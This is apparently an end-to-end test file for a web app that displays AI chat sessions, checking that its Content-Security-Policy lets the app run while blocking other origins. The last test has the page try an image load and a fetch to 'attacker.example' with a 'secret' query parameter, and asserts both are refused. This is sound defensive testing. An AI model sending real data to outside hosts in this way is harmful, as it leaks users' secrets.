import { mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { FIXTURE, FIXTURE_BUCKET, FIXTURE_CWD } from "../support/fixtures.ts";
import { appReady } from "../support/live.ts";
import { expect, type Page, test } from "./fixtures.ts";

/**
 * The page runs under the server's Content-Security-Policy. It must still work (scripts, styles, code
 * highlighting, the WebSocket) and must not talk to anyone else: a model's markdown can name any URL.
 */

declare global {
	interface Window {
		/** Reports a `securitypolicyviolation` event of the page to the test, as "directive blocked-uri". */
		reportCspViolation(violation: string): void;
	}
}

const ANSWER = "const answer: number = 42;";
let session: string;

test.beforeAll(() => {
	session = join(
		process.env.OMPW_E2E_AGENT_DIR as string,
		"sessions",
		FIXTURE_BUCKET,
		"2026-01-07T01-00-00-000Z_01a00000-0000-7000-8000-0000000099c5.jsonl",
	);
	const at = new Date(Date.UTC(2026, 0, 7, 1, 0)).toISOString();
	const entry = (id: string, parentId: string | null, message: Record<string, unknown>) => ({
		type: "message",
		id,
		parentId,
		timestamp: at,
		message: { ...message, timestamp: Date.parse(at) },
	});
	const usage = { input: 1, output: 1, cacheRead: 0, cacheWrite: 0, totalTokens: 2, cost: { total: 0 } };
	const lines = [
		{ type: "session", version: 3, id: "01a00000-0000-7000-8000-0000000099c5", timestamp: at, cwd: FIXTURE_CWD },
		entry("c0000001", null, {
			role: "user",
			content: [{ type: "text", text: "Show me the csp code sample" }],
			attribution: "user",
		}),
		entry("c0000002", "c0000001", {
			role: "assistant",
			content: [{ type: "text", text: `Here it is:\n\n\`\`\`ts\n${ANSWER}\n\`\`\`\n` }],
			api: "anthropic-messages",
			provider: "anthropic",
			model: "claude-haiku-5-5",
			usage,
			stopReason: "stop",
		}),
	];
	mkdirSync(join(session, ".."), { recursive: true });
	writeFileSync(session, `${lines.map((l) => JSON.stringify(l)).join("\n")}\n`);
});
test.afterAll(() => rmSync(session, { force: true }));

/**
 * What the browser refuses to do under the policy, in every page the test visits: the violation events
 * of the page and the console's "Refused to …" messages. The returned list fills as they happen.
 */
async function watchViolations(page: Page): Promise<string[]> {
	const seen: string[] = [];
	page.on("console", (msg) => {
		if (/Content Security Policy|Refused to/i.test(msg.text())) seen.push(msg.text());
	});
	await page.exposeFunction("reportCspViolation", (violation: string) => {
		seen.push(violation);
	});
	await page.addInitScript(() => {
		document.addEventListener("securitypolicyviolation", (e) => {
			window.reportCspViolation(`${e.violatedDirective} ${e.blockedURI}`);
		});
	});
	return seen;
}

test("the app runs under the policy: inline theme script, highlighted code and the WebSocket", async ({ page }) => {
	const violations = await watchViolations(page);
	// The theme script in index.html is inline: it only runs if the policy allows it by hash.
	await page.addInitScript(() => localStorage.setItem("ompw.theme", "light"));
	// The server greets a new socket at once: collect its frames from the moment it exists.
	const received: string[] = [];
	page.on("websocket", (socket) => {
		socket.on("framereceived", (frame) => received.push(String(frame.payload)));
	});

	const response = await page.goto(`/#/s/${encodeURIComponent(session)}`);
	expect(response?.headers()["content-security-policy"]).toContain("img-src 'self' data: blob:");
	await expect(page.locator("html")).not.toHaveClass(/dark/);

	// shiki runs in a worker under script-src 'self' (its JavaScript regex engine needs no WebAssembly) and writes inline style attributes.
	const code = page.locator("pre.shiki").first();
	await expect(code).toContainText(ANSWER);
	await expect(code.locator("span[style]").first()).toBeVisible();

	await expect(page.getByTestId("new-chat")).toBeVisible();
	await expect.poll(() => received.some((payload) => payload.includes('"t":"hello"'))).toBe(true);
	expect(violations).toEqual([]);
});

test("every view runs under the policy: search, panels, dialogs, usage, settings and the terminal", async ({
	page,
}) => {
	const violations = await watchViolations(page);
	await page.goto("/");
	await appReady(page);
	await page.keyboard.press("ControlOrMeta+k");
	await page.getByTestId("palette-input").fill("striped packets");
	await page.getByTestId("search-hit").first().click();
	await expect(page.getByText(FIXTURE.alphaReply)).toBeVisible();
	await page.getByTestId("toggle-panel").click();
	await expect(page.getByTestId("right-panel")).toBeVisible();
	// Settings, at the keyboard shortcuts card (a chunk of its own, `?` away).
	await page.locator("body").click({ position: { x: 600, y: 10 } });
	await page.keyboard.press("?");
	await expect(page.getByTestId("shortcuts")).toBeVisible();

	await page.goto("/#/usage");
	await expect(page.getByTestId("usage-page")).toBeVisible();
	await page.goto("/#/settings");
	await expect(page.getByTestId("settings-page")).toBeVisible();
	// xterm.js in a PTY.
	await page.goto("/#/cli");
	await page.getByTestId("cli-line").fill("--version");
	await page.getByTestId("cli-run").click();
	await expect(page.getByTestId("terminal-status")).toHaveText(/exited 0/, { timeout: 30_000 });

	expect(violations).toEqual([]);
});

test("images load only from the page itself, data: and blob: URLs; fetch only reaches the page's origin", async ({
	page,
}) => {
	const violations = await watchViolations(page);
	await page.goto("/");
	await expect(page.getByTestId("new-chat")).toBeVisible();

	const outcome = await page.evaluate(async () => {
		const image = (src: string) =>
			new Promise<string>((resolve) => {
				const img = new Image();
				img.onload = () => resolve("loaded");
				img.onerror = () => resolve("failed");
				img.src = src;
			});
		const gif = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
		const bytes = Uint8Array.from(atob(gif), (c) => c.charCodeAt(0));
		return {
			remote: await image("https://attacker.example/?d=secret"),
			data: await image(`data:image/gif;base64,${gif}`),
			blob: await image(URL.createObjectURL(new Blob([bytes], { type: "image/gif" }))),
			self: await image("/favicon.png"),
			fetched: await fetch("https://attacker.example/?d=secret").then(
				() => "reached",
				() => "refused",
			),
		};
	});

	expect(outcome).toEqual({ remote: "failed", data: "loaded", blob: "loaded", self: "loaded", fetched: "refused" });
	// Both attempts were refused by the policy itself, not merely failed on the network.
	const refusedBy = () =>
		violations
			.filter((v) => /^[a-z-]+-src /.test(v) && v.includes("attacker.example"))
			.map((v) => v.split(" ")[0])
			.sort();
	await expect.poll(refusedBy).toEqual(expect.arrayContaining(["connect-src", "img-src"]));
});
